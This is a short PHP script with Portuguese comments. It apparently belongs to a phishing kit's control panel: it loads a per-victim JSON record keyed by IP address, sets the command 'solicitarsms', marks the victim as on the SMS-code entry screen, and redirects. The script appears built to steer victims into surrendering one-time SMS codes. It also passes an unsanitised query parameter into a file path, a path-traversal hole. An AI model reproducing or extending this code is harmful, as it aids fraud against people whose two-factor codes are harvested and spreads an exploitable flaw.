<?php 

$ip = $_GET['ip'];

if($ip === "::1"){
    $ip = "127.0.1";
}


$comando = "solicitarsms";

date_default_timezone_set('America/Sao_Paulo');

// Pasta onde estão os arquivos JSON
$pasta_clientes = '../../clientes/';

// Nome do arquivo JSON
$arquivo_json = $pasta_clientes . $ip . '.json';

// Verifica se o arquivo existe
if (file_exists($arquivo_json)) {
    // Lê o conteúdo do arquivo JSON
    $json_string = file_get_contents($arquivo_json);

    // Decodifica o JSON para um array associativo
    $dados_cliente = json_decode($json_string, true);

    // Verifica se a decodificação foi bem-sucedida
    if ($dados_cliente === null) {
        echo "Erro ao decodificar o arquivo JSON: $arquivo_json <br>";
    } else {
        // Altera o valor da chave 'email'
                $dados_cliente['data_aceso'] = date('H:i:s');
            	$dados_cliente['comando'] = $comando;
                $dados_cliente['status'] = "Usuario na tela de digitar o codigo sms";

        

        // Converte os dados modificados de volta para JSON
        $json_atualizado = json_encode($dados_cliente);

        // Verifica se houve erro na conversão para JSON
        if ($json_atualizado === false) {
            echo "Erro ao codificar os dados para JSON.";
        } else {
            // Salva o JSON atualizado no arquivo
            if (file_put_contents($arquivo_json, $json_atualizado) !== false) {
header("Location: index.php?ip=$ip");


            } else {
                echo "Erro ao salvar o arquivo JSON.";
            }
        }
    }
} else {
    echo "O arquivo JSON não foi encontrado.";
}


?>
